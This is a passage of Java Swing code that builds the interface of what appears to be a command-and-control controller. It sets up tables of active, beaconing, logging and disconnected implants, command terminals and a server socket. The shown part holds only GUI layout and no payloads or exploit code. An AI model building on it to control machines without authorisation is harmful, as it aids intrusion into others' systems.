//			jpnlHeapSize.add(jlblUptime_Minutes);					jpnlHeapSize.add(new JLabel(":"));
//			jpnlHeapSize.add(jlblUptime_Secondss);					
			
			jpnlHeapSize.add(jlblHeapSize_Current_Text );			jpnlHeapSize.add(jlblHeapSize_Current);
			jpnlHeapSize.add(jlblHeapSize_Available_Text);			jpnlHeapSize.add(jlblHeapSize_Available);
			jpnlHeapSize.add(jlblHeapSize_Consumed_Text);			jpnlHeapSize.add(jlblHeapSize_Consumed);
			jpnlHeapSize.add(jlblHeapSize_Max_Text );				jpnlHeapSize.add(jlblHeapSize_Max);
			
			jpnlHeapSize.add(jcbAppearance);
			jpnlHeapSize.add(jcbFontSize);
			jpnlHeapSize.add(jbtnClearConsoleOut);
			jpnlHeapSize.add(jcbAutoScrollConsoleOut);
			
			jlblUpTime.setToolTipText("Days : Hours : Minutes : Seconds");
			jlblUpTime_Text.setToolTipText("Days : Hours : Minutes : Seconds");
			
//			jlblUptime_Days.setToolTipText("Days");
//			jlblUptime_Hours.setToolTipText("Hours");
//			jlblUptime_Minutes.setToolTipText("Minutes");
//			jlblUptime_Secondss.setToolTipText("Seconds");
			
			jbtnClearConsoleOut.addActionListener(this);
			jcbAutoScrollConsoleOut.addActionListener(this);
			
			
			jpnlHeapSize_Alignment.add(BorderLayout.EAST, jpnlHeapSize);
			jpnlHeapSize_Alignment.setBorder(new BevelBorder(BevelBorder.LOWERED, null, null, null, null));
			
			jpnlSouth.add(jpnlHeapSize_Alignment);
			
			jlblHeapSize_Current.setForeground(Color.black);
			jlblHeapSize_Available.setForeground(Color.black);
			jlblHeapSize_Max.setForeground(Color.black);
			/**********************************************************
			 * WORKER THREAD
			 *********************************************************/
			
			thdWorkerJLabels = new Thread_JLabels(jlblHeapSize_Current, jlblHeapSize_Available, jlblHeapSize_Consumed, jlblHeapSize_Max, jlblCurrentTime, jlblZuluTime, jlblUpTime);
			thdWorkerJLabels.start();
			
			/***************************
			 * CONNECTION STATUS TAB
			 **************************/
			jpnlServerSocketSettings_Title.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Connection Settings", TitledBorder.LEADING, TitledBorder.TOP, null, new Color(0, 51, 255)));				
			
			
			jpnlConnectionStatus_1.add(BorderLayout.WEST, jpnlServerSocket);
			jpnlConnectionStatus_2.add(BorderLayout.WEST, jpnlConnectToImplant);
			
			jpnlConnectionStatus_1.setBorder(new BevelBorder(BevelBorder.LOWERED, null, null, null, null));
			jpnlConnectionStatus_2.setBorder(new BevelBorder(BevelBorder.LOWERED, null, null, null, null));
			jpnlConnectionStatus_3.setBorder(new BevelBorder(BevelBorder.LOWERED, null, null, null, null));
			jpnlConnectionStatus_4.setBorder(new BevelBorder(BevelBorder.LOWERED, null, null, null, null));
			
			jpnlServerSocketSettings_Title.add(jpnlConnectionStatus_4);
			jpnlServerSocketSettings_Title.add(jpnlConnectionStatus_1);
			jpnlServerSocketSettings_Title.add(jpnlConnectionStatus_3);
			jpnlServerSocketSettings_Title.add(jpnlConnectionStatus_2);
			
			
			
			jpnlConnectionTab.add(BorderLayout.NORTH, this.jpnlServerSocketSettings_Title);
			
			/*************************************
			 * JTable
			 ************************************/
			
			jtblConnectedAgents = new JTable_Solomon(Drivers.vctJTableConnectedAgentsColNames, Drivers.vctJTableConnectedAgentsToolTips, "ACTIVE IMPLANTS", Color.blue.darker(), null);
			Drivers.jtblConnectedImplants = this.jtblConnectedAgents;
			jpnlJTable_Title.add(BorderLayout.CENTER, jtblConnectedAgents);
			jpnlJTable_Title.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Connected Implants", TitledBorder.LEADING, TitledBorder.TOP, null, new Color(0, 51, 255)));
			
			
			jtblDisconnectedAgents = new JTable_Solomon(Drivers.vctJTableDISCONNECTED_AGENTS_ConnectedAgentsColNames, Drivers.vctJTableDISCONNECTED_AGENTS_ConnectedAgentsToolTips, "DISCONNECTED IMPLANTS", Color.RED.darker(), null);
			Drivers.jtblDisconnectedImplants = this.jtblDisconnectedAgents;
			jpnlJTable_DisconneectedImplants_Title.add(BorderLayout.CENTER, jtblDisconnectedAgents);
			jpnlJTable_DisconneectedImplants_Title.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Disconnected Implants", TitledBorder.LEADING, TitledBorder.TOP, null, new Color(0, 51, 255)));
			
			jtblBeaconingAgents = new JTable_Solomon(Drivers.vctJTableBEACONING_AGENTS_ConnectedAgentsColNames, Drivers.vctJTableBEACONING_AGENTS_ConnectedAgentsToolTips, "BEACONING IMPLANTS", new Color(101,45,93), null);
			Drivers.jtblBeaconImplants = this.jtblBeaconingAgents;
			this.jtblBeaconingAgents.i_am_beacon_jtable = true;
			jtblBeaconingAgents.jbtnClear.setVisible(true);
			jtblBeaconingAgents.jbtnClear.addActionListener(this);
			jpnlJTable_BeaconingImplants_Title.add(BorderLayout.CENTER, jtblBeaconingAgents);
			jpnlJTable_BeaconingImplants_Title.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Beaconing Implants", TitledBorder.LEADING, TitledBorder.TOP, null, new Color(0, 51, 255)));
			
			
			jtblLoggieAgents = new JTable_Solomon(Drivers.vctJTableConnectedAgentsColNames, Drivers.vctJTableConnectedAgentsToolTips, "LOGGING AGENTS", Color.green.darker().darker(), null);
			Drivers.jtblLoggingAgents = this.jtblLoggieAgents;
			jtblLoggieAgents.jbtnDisconnectImplant.setEnabled(false);
			jtblLoggieAgents.jbtnRefresh.setEnabled(false);
			jtblLoggieAgents.jbtnDisconnectImplant.setText("Disconnect Selected Agent");
			this.jtblLoggieAgents.i_am_loggie_jtable = true;
			jtblLoggieAgents.jbtnRefresh.setVisible(true);
			jpnlJTable_LoggingAgents_Title.add(BorderLayout.CENTER, jtblLoggieAgents);
			jpnlJTable_LoggingAgents_Title.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Logging Agents", TitledBorder.LEADING, TitledBorder.TOP, null, new Color(0, 51, 255)));
			
			
//jpnlConnectionTab.add(BorderLayout.CENTER, this.jpnlJTable_Title);
			
			
			
			/****************************
			 * JTEXTPANE
			 ****************************/
			
			//jpnlConsoleOut_Title.add(BorderLayout.CENTER, jtaConsoleOut);
			jpnlConsoleOut_Title.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Console Out", TitledBorder.LEADING, TitledBorder.TOP, null, new Color(0, 51, 255)));
			
			jtxtpne_ConsoleOut  = new JPanel_TextDisplayPane();
			Drivers.jtxtpne_CnslOut = jtxtpne_ConsoleOut; 
			Driver.jtxtpne_CnslOut = jtxtpne_ConsoleOut;
			jscrlPne_ConsoleOut	 = new JScrollPane(jtxtpne_ConsoleOut);
			
			jscrlPne_ConsoleOut.setPreferredSize(new Dimension(1,90));
			
			jpnlConsoleOut_Title.add(BorderLayout.CENTER, jscrlPne_ConsoleOut);
											
//jpnlConnectionTab.add(BorderLayout.SOUTH, jpnlConsoleOut_Title); 
			//jtaConsoleOut.setEditable(false);
			
			
			/*************************************
			 * JSPLIT PANE
			 ************************************/
			tabbedPane_IMPLANTS.addTab("Active", jpnlJTable_Title);
			tabbedPane_IMPLANTS.addTab("Beaconing", jpnlJTable_BeaconingImplants_Title);
			tabbedPane_IMPLANTS.addTab("Logging", jpnlJTable_LoggingAgents_Title);
			tabbedPane_IMPLANTS.addTab("DISCONNECTED", jpnlJTable_DisconneectedImplants_Title);
			
			
//jspltPne_JTbl_And_Console = new JSplitPane(JSplitPane.VERTICAL_SPLIT, tabbedPane_IMPLANTS, jpnlConsoleOut_Title);
//jspltPne_JTbl_And_Console.setOneTouchExpandable(true);
//jspltPne_JTbl_And_Console.setDividerLocation(350);
//jpnlConnectionTab.add(BorderLayout.CENTER, this.jspltPne_JTbl_And_Console);
			
			/*************************************
			 * JSPLIT PANE MAIN //2013-02-07 solo-edits
			 ************************************/
			jpnlConnectionTab.add(BorderLayout.CENTER, this.tabbedPane_IMPLANTS);
			jspltPne_Main = new JSplitPane(JSplitPane.VERTICAL_SPLIT, tabbedPane_Main, jpnlConsoleOut_Title);
			jspltPne_Main.setOneTouchExpandable(true);
			jspltPne_Main.setDividerLocation(460);
			getContentPane().add(BorderLayout.CENTER, this.jspltPne_Main);
			
			/*************************************
			 * END
			 ************************************/
			tabbedPane_Main.addTab("   Connection Status   ", jpnlConnectionTab);
			
			//add tabbedpane to GUI
			//this.jpnlMain.add(this.tabbedPane_Main);
//getContentPane().add(BorderLayout.CENTER, tabbedPane_Main);
			
			
			
		}
		catch(Exception e)
		{
			
			
		}
		
	}
	
	public boolean closeServerSocket()
	{
		try
		{
			if(this.thdServerSocket != null && this.thdServerSocket.svrSocket.isBound())
			{
				if(Drivers.jop_Confirm("ServerSocket is currently open.  \nDo you wish to close the ServerSocket?", "Confirm close ServerSocket") != JOptionPane.YES_OPTION)
				{
					//punt! get out of here and do not close serversocket
					return false;
				}
			}
			
			else
			{
				Drivers.jop_Error("ServerSocket does not appear to be open", "Unable to Continue");
				
				//server socket is no open
				return false;
			}
			
			//Choke the serversocket!
			this.thdServerSocket.svrSocket.close();
			
			this.thdServerSocket.keepServerSocketOpen = false;
			
			this.thdServerSocket = null;
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("closeServerSocket", strMyClassName, e, e.getLocalizedMessage(), false);
			
		}
		
		return false;
	}
	
	/*public void initializeBroadcastMessages()
	{
		try
		{
			txtpne_broadcastMessages = new JPanel_TextDisplayPane();
			jscrlPne_BroadcastMessage = new JScrollPane(txtpne_broadcastMessages);
			jscrlPne_BroadcastMessage.setBounds(10, 11, 740, 338);			
			//jpnlMainController.add(jscrlPne_BroadcastMessage);
			jpnlMainController.add(jpnlMessage_Text_And_ActionButton);
			jpnlMessage_Text_And_ActionButton.add(BorderLayout.CENTER, jscrlPne_BroadcastMessage);
			jpnlMessage_Text_And_ActionButton.setBounds(10, 11, 745, 414);
			
			
			jpnlSend.setLayout(new BorderLayout());
			jpnlSend.add(BorderLayout.CENTER, jtfCommand);
			jbtnSend = new JButton("Broadcast");
			jpnlSend.add(BorderLayout.EAST, jbtnSend);
			jpnlSend.setBorder(new BevelBorder(BevelBorder.RAISED, null, null, null, null));
			jpnlMessage_Text_And_ActionButton.add(BorderLayout.SOUTH, jpnlSend);
			
			
			jscrlPne_BroadcastMessage.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_AS_NEEDED);
			jscrlPne_BroadcastMessage.setBorder(new CompoundBorder(new BevelBorder(BevelBorder.RAISED, null, null, null, null), new BevelBorder(BevelBorder.LOWERED, null, null, null, null)));
			
			jpnlConnectedClients = new JPanel();
			jpnlConnectedClients.setBounds(760, 11, 235, 414);
			jpnlMainController.add(jpnlConnectedClients);
			
			jpnlConnectedClients.setLayout(new BorderLayout());
			jpnlConnectedClients.setBorder(new CompoundBorder(new BevelBorder(BevelBorder.RAISED, null, null, null, null), new BevelBorder(BevelBorder.LOWERED, null, null, null, null)));
			
			jpnlConnectedClients.add(BorderLayout.NORTH, jlblConnectedClients_Text);
			jpnlConnectedClients.add(BorderLayout.CENTER, jscrlPne_ConnectedClients);
			jpnlConnectedClients.add(BorderLayout.SOUTH, jpnlSouth_ConnectedClients); 
			
			jbtnPrivate = new JButton("Private Terminal");
			jpnlSouth_ConnectedClients.add(jbtnPrivate);
			jpnlSouth_ConnectedClients.add(jpnlPrivateChatOptions );
			btngrp.add(jrbPrivateFrame);btngrp.add(jrbPrivateTab);
			jpnlPrivateChatOptions.add(jrbPrivateFrame);
			jpnlPrivateChatOptions.add(jrbPrivateTab);
			jbtnPrivate.setBackground(Color.red);
			
			//tooltips yup, git ya sum!!!
			jlblConnectedClients_Text.setToolTipText(strConnectedClientsToolTip);
			jlstConnectedClients.setToolTipText(strConnectedClientsToolTip);
			
			jlblConnectedClients_Text.setBorder(new BevelBorder(BevelBorder.RAISED, null, null, null, null));
			
			
			
			txtpne_broadcastMessages.appendString(true, false, "ME", "You", "Test Msg");
		}
		catch(Exception e)
		{
			Drivers.eop("initializeBroadcastMessages", strMyClassName, e, "", true);
		}
	}*/
	
	public void initializeControllerWindow()
	{
		try
		{
			jpnlMainController = new JPanel_MainControllerWindow(JPanel_MainControllerWindow.INDEX_THIS_IS_MAIN_BROADCAST_TERMINAL, false, null);
			Drivers.txtpne_broadcastMessageBoard = jpnlMainController.txtpne_broadcastMessages;
			
			jpnlBeaconCommandsControllerWindow = new JPanel_MainControllerWindow(JPanel_MainControllerWindow.  INDEX_THIS_IS_BEACONING_BROADCAST_TERMINAL, false, null);
			Drivers.txtpne_BEACON_broadcastMessageBoard = jpnlBeaconCommandsControllerWindow.txtpne_broadcastMessages;

			
			//jpnlMainController.setLayout(null);
			
			Drivers.dfltLstMdl_ConnectedImplants = jpnlMainController.dfltLstMdl_ConnectedClients;
			Drivers.jlstConnectedImplants = jpnlMainController.jlstConnectedClients;
			
			Drivers.dfltLstMdl_BeaconingImplants = jpnlBeaconCommandsControllerWindow.dfltLstMdl_ConnectedClients;
			Drivers.jlstBeaconImplants = jpnlMainController.jlstConnectedClients;
			
			jpnlChatTerminal = new JPanel_MainControllerWindow(JPanel_MainControllerWindow.INDEX_THIS_IS_CHAT_BROADCAST_TERMINAL, false, null);
			Drivers.txtpne_mainChatBoard = jpnlChatTerminal.txtpne_broadcastMessages;
			
			Drivers.dfltLstMdl_ConnectedControllers = jpnlChatTerminal.dfltLstMdl_ConnectedClients;
			Drivers.jlstConnectedControllers = jpnlChatTerminal.jlstConnectedClients;
			jpnlChatTerminal.configureInterface_ChatClient();
			
			tabbedPane_Main.addTab("  Command Terminal  ", this.jpnlMainController);
			tabbedPane_Main.addTab("  Collaboration Chat  ", this.jpnlChatTerminal);
			
			
			Drivers.alBeaconCommands_GUI.add(beaconCommand);
			this.updateBeaconingCommandList_GUI();
			beaconCommand.jbtnAddBeaconCommand.addActionListener(this);
			beaconCommand.jbtnDeleteThisCommand.addActionListener(this);
			jscrlpneBeaconCommands = new JScrollPane(jpnlBeaconCommands);
			jspltpne_BeaconTerminal = new JSplitPane(JSplitPane.VERTICAL_SPLIT, jscrlpneBeaconCommands, jpnlBeaconCommandsControllerWindow);
			jspltpne_BeaconTerminal.setOneTouchExpandable(true);
			jspltpne_BeaconTerminal.setDividerLocation(50);
			tabbedPane_Main.addTab("  Beaconing Agents' Command Terminal  ", this.jspltpne_BeaconTerminal);
			
			/*jpnlChatTerminal.jtfCommand_Broadcast.setText("FEATURE COMING SOON!!!");
			jpnlChatTerminal.jtfCommand_Broadcast.setEditable(false);
			jpnlChatTerminal.jbtnSend_Broadcast.setEnabled(false);
			jpnlChatTerminal.jbtnClearScreen.setEnabled(false);
			jpnlChatTerminal.jbtnDisconnectClient.setEnabled(false);
			jpnlChatTerminal.jcbAutoScroll.setEnabled(false);
			jpnlChatTerminal.jbtnPrivate.setEnabled(false);
			jpnlChatTerminal.jrbPrivateFrame.setEnabled(false);
			
			jpnlChatTerminal.jlblConnectedClients_Text.setText("Connected Controllers");
			jpnlChatTerminal.jcbShortcuts.setEnabled(false);
			jpnlChatTerminal.jbtnOpenFileHive.setEnabled(false);
			jpnlChatTerminal.jlstConnectedClients.setEnabled(false);
			jpnlChatTerminal.txtpne_broadcastMessages.appendStatusMessageString(false, "------------>>>>>>>> THIS FEATURE IS COMING SOON!!!");*/
							
		}
		catch(Exception e)
		{
			Drivers.eop("initializeControllerWindow", strMyClassName, e, "", true);
		}
	}
	
	public void initializeConnectedAgentsColNames()
	{
		try
		{
			for(int i = 0; i < Drivers.jTableConnectedAgentsColNames.length; i++)
			{
				Drivers.vctJTableConnectedAgentsColNames.add(Drivers.jTableConnectedAgentsColNames[i]);		
				Drivers.vctJTableConnectedAgentsToolTips.add(Drivers.arrJTableConnectedAgentsToolTips[i]);
			}			
			
			for(int i = 0; i < Drivers.jTableDISCONNECTED_AGENTS_ConnectedAgentsColNames.length; i++)
			{
				Drivers.vctJTableDISCONNECTED_AGENTS_ConnectedAgentsColNames.add(Drivers.jTableDISCONNECTED_AGENTS_ConnectedAgentsColNames[i]);		
				Drivers.vctJTableDISCONNECTED_AGENTS_ConnectedAgentsToolTips.add(Drivers.arrJTableDISCONNECTED_AGENTS_ConnectedAgentsToolTips[i]);
			}	
			
			for(int i = 0; i < Drivers.arrJTableBEACONING_AGENTS_ConnectedAgentsColNames.length; i++)
			{
				Drivers.vctJTableBEACONING_AGENTS_ConnectedAgentsColNames.add(Drivers.arrJTableBEACONING_AGENTS_ConnectedAgentsColNames[i]);
				Drivers.vctJTableBEACONING_AGENTS_ConnectedAgentsToolTips.add(Drivers.arrJTableBEACONING_AGENTS_ConnectedAgentsToolTips[i]);
			}
						
		}
		catch(Exception e)
		{
			Drivers.eop("initializeConnectedAgentsColNames", strMyClassName, e, "", true);
		}
	}
	
	
}
